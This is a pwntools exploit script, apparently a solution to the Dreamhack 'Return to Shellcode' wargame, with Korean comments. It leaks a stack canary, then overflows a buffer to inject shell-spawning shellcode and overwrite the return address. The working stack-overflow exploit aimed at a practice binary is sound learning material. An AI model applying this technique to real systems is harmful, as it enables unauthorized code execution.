'''
[Dreamhack] Return to Shellcode
1. 취약점: rwx 스택과 bof 로 인해 RET 주소 덮어쓰기 가능
2. 시나리오: 첫 번째 입력으로 Canary을 유출하고, 두 번째 입력으로 buf에 쉘 코드를 삽입하고, RET 주소를 buf로 덮어씀
3. 페이로드 구조:
    3-1. 첫 번째 페이로드: [Dummy (buf + canary의 최상위 1바이트)]
    3-2. 두 번째 페이로드: [Dummy (buf2canary)] + [Canary] + [Dummy (sfp)] + [buf 변수 주소]
'''

from pwn import *

context.arch = 'amd64'

p = process('./r2s')
# p = remote('IP', PORT)

# [1] catch the information
p.recvuntil(b'Address of the buf: ')
buf_addr = int(p.recvuntil(b'\n'), 16)

p.recvuntil(b'Distance between buf and $rbp: ')
offset_buf_rbp = int(p.recvuntil(b'\n'), 10)

# [2] Leak canary
payload = b'A' * (offset_buf_rbp - 0x8) + b'B'
p.sendafter(b'Input: ', payload)

p.recvuntil(b'B')
canary_leaked = u64(b'\x00' + p.recv(7))

print(f"{hex(buf_addr)=}")
print(f"{offset_buf_rbp=}")
print(f"{hex(canary_leaked)=}")

# [3] return to shell
shellcode = asm(shellcraft.sh())
payload = shellcode                             # buf
payload += b'A' * (0x50 - len(shellcode))       # remained buf
payload += b'B' * (offset_buf_rbp - 0x50 - 0x8) # padding
payload += p64(canary_leaked)                   # canary
payload += p64(0xDEADBEEF)                      # SBP
payload += p64(buf_addr)                        # RET

p.sendlineafter(b'Input: ', payload)

p.interactive()